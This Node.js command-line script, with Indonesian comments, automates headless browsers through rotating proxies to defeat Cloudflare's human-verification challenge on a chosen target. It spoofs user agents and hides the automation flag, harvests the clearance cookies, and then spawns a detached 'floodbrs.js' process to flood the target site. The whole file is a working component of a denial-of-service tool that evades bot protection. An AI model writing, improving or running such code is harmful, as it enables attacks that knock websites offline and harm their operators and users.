const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserAgent = require('user-agents');
const { spawn } = require('child_process');

puppeteer.use(StealthPlugin());

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

console.log(`[ START ] Cloudflare Bypass Started - Target: ${targetURL}`);

// Read proxies - format: ip:port
const readProxies = (filePath) => {
    try {
        const proxies = fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
        return proxies.map(proxy => {
            // Pastikan format ip:port
            if (proxy.includes('://')) {
                // Remove http:// or https:// jika ada
                return proxy.replace(/https?:\/\//, '');
            }
            return proxy;
        });
    } catch (error) {
        return [];
    }
};

// Generate user agent
const generateUserAgent = () => {
    const userAgent = new UserAgent({ deviceCategory: 'desktop' });
    return userAgent.toString();
};

// Simple wait function
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const randomSleep = (min, max) => sleep(Math.random() * (max - min) + min);

// Cloudflare Cookie Class
class CloudflareCookie {
    constructor(cookieData) {
        this.name = cookieData.name || "";
        this.value = cookieData.value || "";
        this.domain = cookieData.domain || "";
        this.path = cookieData.path || "/";
        this.expires = cookieData.expires || 0;
        this.httpOnly = cookieData.httpOnly || false;
        this.secure = cookieData.secure || false;
        this.sameSite = cookieData.sameSite || "Lax";
    }

    static fromJSON(cookieData) {
        return new CloudflareCookie(cookieData);
    }

    toString() {
        return `${this.name}=${this.value}`;
    }
}

// Find Cloudflare cookies
const findCloudflareCookies = (cookies) => {
    const cfCookies = cookies.filter(cookie => 
        cookie.name.includes('cf_') || 
        cookie.name.includes('_cf') ||
        cookie.name === 'cf_clearance' ||
        cookie.name === '__cf_bm'
    ).map(cookie => CloudflareCookie.fromJSON(cookie));
    
    return cfCookies;
};

// Enhanced Cloudflare bypass
const advancedCloudflareBypass = async (page) => {
    try {
        console.log(`[ BYPASS ] Starting Cloudflare challenge...`);
        
        // Tunggu halaman challenge load
        await page.waitForFunction(() => document.readyState === 'complete');
        await randomSleep(3000, 6000);

        // Cek multiple selector untuk tombol challenge
        const challengeSelectors = [
            'input[type="checkbox"]',
            '.hcaptcha-box',
            '[role="checkbox"]',
            '.cf-checkbox',
            '#challenge-stage input',
            'input[name="cf_captcha_kind"]',
            '.verify-you-are-human',
            '.button',
            '.btn',
            'button',
            'input[type="submit"]',
            '[onclick*="submit"]',
            '.success',
            '.primary'
        ];

        let solved = false;

        for (const selector of challengeSelectors) {
            try {
                const element = await page.$(selector);
                if (element) {
                    console.log(`[ BYPASS ] Found element: ${selector}`);
                    
                    // Scroll ke element
                    await page.evaluate(el => el.scrollIntoView(), element);
                    await randomSleep(500, 1500);
                    
                    // Click element
                    await element.click({ delay: 100 });
                    console.log(`[ BYPASS ] Clicked: ${selector}`);
                    
                    solved = true;
                    await randomSleep(5000, 8000);
                    break;
                }
            } catch (e) {
                continue;
            }
        }

        // Jika belum ketemu, coba click berdasarkan text
        if (!solved) {
            console.log(`[ BYPASS ] Trying text-based click...`);
            const clickableTexts = [
                'Verify you are human',
                'Submit',
                'Continue',
                'Verify',
                'I am human',
                'Checkbox'
            ];

            for (const text of clickableTexts) {
                try {
                    const [button] = await page.$x(`//button[contains(., '${text}')]`);
                    if (button) {
                        await button.click({ delay: 100 });
                        console.log(`[ BYPASS ] Clicked text: ${text}`);
                        solved = true;
                        await randomSleep(5000, 8000);
                        break;
                    }
                } catch (e) {
                    continue;
                }
            }
        }

        // Tunggu hasil
        await randomSleep(8000, 12000);

        // Check if solved
        const title = await page.title();
        const url = await page.url();
        
        const isSuccess = !title.includes('Just a moment') && 
                         !title.includes('Checking your browser') &&
                         !title.includes('Please wait') &&
                         !url.includes('challenge');

        if (isSuccess) {
            console.log(`[ BYPASS ] Challenge solved!`);
            return { success: true };
        }

        return { success: false };

    } catch (error) {
        console.log(`[ BYPASS ] Error: ${error.message}`);
        return { success: false };
    }
};

// Process each browser
const processBrowser = async (proxy, index, total) => {
    let browser;
    try {
        const userAgent = generateUserAgent();
        
        const args = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--no-first-run',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--disable-web-security',
            '--disable-features=site-per-process',
            '--disable-blink-features=AutomationControlled',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`
        ];

        // Add proxy if available (format: ip:port)
        if (proxy && proxy.trim()) {
            args.push(`--proxy-server=http://${proxy}`);
            console.log(`[ THREAD ${index} ] Using proxy: ${proxy}`);
        }

        browser = await puppeteer.launch({
            headless: true,
            args: args,
            ignoreHTTPSErrors: true
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1920, height: 1080 });

        // Enhanced stealth
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        });

        // Set extra headers
        await page.setExtraHTTPHeaders({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'no-cache',
            'pragma': 'no-cache'
        });

        console.log(`[ THREAD ${index} ] Navigating to target...`);
        
        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 60000 
        });

        // Solve Cloudflare
        console.log(`[ THREAD ${index} ] Solving Cloudflare...`);
        const bypassResult = await advancedCloudflareBypass(page);
        
        if (!bypassResult.success) {
            console.log(`[ THREAD ${index} ] Bypass failed`);
            await browser.close();
            return { success: false };
        }

        // Get cookies
        const title = await page.title();
        const cookies = await page.cookies();
        const cfCookies = findCloudflareCookies(cookies);
        
        if (cfCookies.length === 0) {
            console.log(`[ THREAD ${index} ] No Cloudflare cookies found`);
            await browser.close();
            return { success: false };
        }

        const cookieString = cfCookies.map(cookie => cookie.toString()).join('; ');
        await browser.close();

        // LOG OUTPUT
        console.log(`[ SUCCESS ] Total Solve : ${index} | Title : ${title} | proxy : ${proxy} | useragent : ${userAgent} | cookies : ${cookieString} |`);
        console.log(`[ SPAWN ] Flood with cookies : ${cookieString} : useragent : ${userAgent}`);

        // Start flood
        spawn('node', [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1',
            proxyFile,
            cookieString,
            userAgent,
            'cf-cookie'
        ], {
            detached: true,
            stdio: 'ignore'
        });

        return { success: true };
        
    } catch (error) {
        console.log(`[ THREAD ${index} ] Error: ${error.message}`);
        if (browser) await browser.close();
        return { success: false };
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        console.log(`[ ERROR ] No proxies found in file: ${proxyFile}`);
        return;
    }

    console.log(`[ INFO ] Loaded ${proxies.length} proxies`);
    console.log(`[ INFO ] Starting threads...`);

    for (let i = 0; i < Math.min(proxies.length, threads); i++) {
        await processBrowser(proxies[i], i + 1, proxies.length);
        
        // Delay antara thread
        if (i < Math.min(proxies.length, threads) - 1) {
            await sleep(10000);
        }
    }

    console.log(`[ COMPLETE ] All threads finished`);
    await sleep(duration * 1000);
};

main().catch(console.error);
